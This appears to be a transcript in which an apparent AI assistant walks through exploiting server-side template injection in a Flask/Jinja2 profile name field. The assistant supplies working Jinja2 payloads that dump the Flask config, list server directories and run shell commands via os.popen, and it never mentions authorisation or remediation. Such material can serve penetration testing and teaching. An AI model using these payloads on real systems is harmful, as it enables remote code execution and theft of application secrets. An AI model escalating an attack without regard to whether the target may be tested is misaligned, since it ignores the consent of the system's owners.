title: SSTI in Jinja2 via user profile name field
user:
The user profile page at /profile renders the user's name in an HTML template. The name field is submitted via POST /profile/update with {name: "..."}. The response renders the name with a welcome message:

Welcome, {name}!

. The server runs Python/Flask with Jinja2 (from Server header and error page stack traces). When the name is set to {{7*7}}, the page renders 'Welcome, 49!'.
assistant:
RECON: confirmed SSTI — the template engine (Jinja2) evaluates {{7*7}} as 49. This means the 'name' field is injected into the Jinja2 template WITHOUT sanitization/escaping. The app is Python/Flask (Flask uses Jinja2 by default).

HYPOTHESIS: SSTI can escalate to RCE. In Jinja2, template expressions can access Python builtins through the request object: {{ request.application.__globals__.__builtins__ }}. This gives access to os.popen, subprocess, etc. The path to RCE is well-documented: {{ ''.__class__.__mro__[2].__subclasses__() }} → find subprocess.Popen → execute commands.

TEST: minimal probe — confirm RCE capability without executing a destructive command:
1. Payload: {{ config }} — dump Flask config (may contain secrets)
2. Payload: {{ request.application.__globals__.__builtins__.__import__('os').listdir('.') }} — list directory
3. If directory listing works, escalate to command execution:
   {{ lipsum.__globals__['os'].popen('id').read() }}
4. Non-destructive verification: {{ lipsum.__globals__['os'].popen('whoami').read() }}

INDICATOR: the page renders the output of `id` or `whoami` in the HTML, confirming RCE.
